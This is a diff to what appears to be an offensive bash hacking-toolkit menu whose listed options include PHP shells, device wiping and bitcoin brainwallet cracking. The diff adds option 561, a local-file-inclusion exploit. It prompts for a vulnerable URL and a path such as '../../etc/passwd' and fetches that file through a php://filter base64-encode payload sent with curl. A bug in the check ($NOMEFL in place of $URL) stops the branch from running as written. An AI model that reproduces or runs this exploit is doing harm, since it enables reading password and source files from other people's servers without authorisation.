@@ -487,6 +487,7 @@ while true; do
 	echo -ne " 366. create simple php shell GET request\t367. create simple php shell with REQUESTS\n"
 	echo -ne " 389. packets capture\t\t\t\t416. try to install repository\t\t\t\t417. get email addresses (mx data)\n"
 	echo -ne " 429. wipe an external device\t\t\t430. wipe a file\t\t\t\t\t431. shred a file\n"
+	echo -ne " 561. get a remote file in base64 encode\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -3007,6 +3008,19 @@ while true; do
 	;;
 	"560")
 		Clona "Datalux/Osintgram"
+	;;
+	"561")
+		echo "Digit an url with protocol and get parameter with equal sign"
+		read -p "(example, http://site.web/news.php?file=): " URL
+		if [[ "$NOMEFL" != "" ]];
+		then
+			echo "Digit the file name or path, even with directory traversal, to encode in base64"
+			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
+			if [[ "$PAGE" != "" ]];
+			then
+				curl "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
